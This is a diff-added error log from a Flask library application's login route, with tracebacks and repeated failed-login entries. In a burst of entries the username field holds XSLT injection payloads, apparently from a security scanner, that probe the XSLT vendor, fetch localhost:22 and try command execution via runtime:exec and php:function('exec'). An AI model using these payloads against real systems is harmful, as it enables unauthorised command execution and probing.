+2025-09-28 16:18:00 | ERROR | 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+2025-09-28 16:18:00 | ERROR | Traceback (most recent call last):
+  File "C:\Users\Lenovo\Desktop\Proyecto Biblioteca\BibliotecaGM\src\usuarios\routes\login.py", line 26, in login
+    usuario = request.form["usuario"]
+              ~~~~~~~~~~~~^^^^^^^^^^^
+  File "C:\Users\Lenovo\Desktop\Proyecto Biblioteca\BibliotecaGM\venv\Lib\site-packages\werkzeug\datastructures\structures.py", line 238, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: 
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: @
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: +
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario:  
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: |
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:18:00 | ERROR | 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+2025-09-28 16:18:00 | ERROR | Traceback (most recent call last):
+  File "C:\Users\Lenovo\Desktop\Proyecto Biblioteca\BibliotecaGM\src\usuarios\routes\login.py", line 27, in login
+    password = request.form["password"]
+               ~~~~~~~~~~~~^^^^^^^^^^^^
+  File "C:\Users\Lenovo\Desktop\Proyecto Biblioteca\BibliotecaGM\venv\Lib\site-packages\werkzeug\datastructures\structures.py", line 238, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:18:02 | ERROR | Datos incorrectos - Usuario: <
+2025-09-28 16:18:02 | ERROR | Datos incorrectos - Usuario: <xsl:value-of select="system-property('xsl:vendor')"/>
+2025-09-28 16:18:02 | ERROR | Datos incorrectos - Usuario: system-property('xsl:vendor')/>
+2025-09-28 16:18:02 | ERROR | Datos incorrectos - Usuario: "/><xsl:value-of select="system-property('xsl:vendor')"/><!--
+2025-09-28 16:18:02 | ERROR | Datos incorrectos - Usuario: <xsl:value-of select="system-property('xsl:vendor')"/><!--
+2025-09-28 16:18:02 | ERROR | Datos incorrectos - Usuario: <xsl:value-of select="document('http://localhost:22')"/>
+2025-09-28 16:18:02 | ERROR | Datos incorrectos - Usuario: <xsl:variable name="rtobject" select="runtime:getRuntime()"/>
+<xsl:variable name="process" select="runtime:exec($rtobject,'erroneous_command')"/>
+<xsl:variable name="waiting" select="process:waitFor($process)"/>
+<xsl:value-of select="$process"/>
+2025-09-28 16:18:02 | ERROR | Datos incorrectos - Usuario: <xsl:value-of select="php:function('exec','erroneous_command 2>&amp;1')"/>
+2025-09-28 16:18:03 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:18:03 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:18:03 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:18:03 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-29 19:52:04 | ERROR | Datos incorrectos - Usuario: sergio
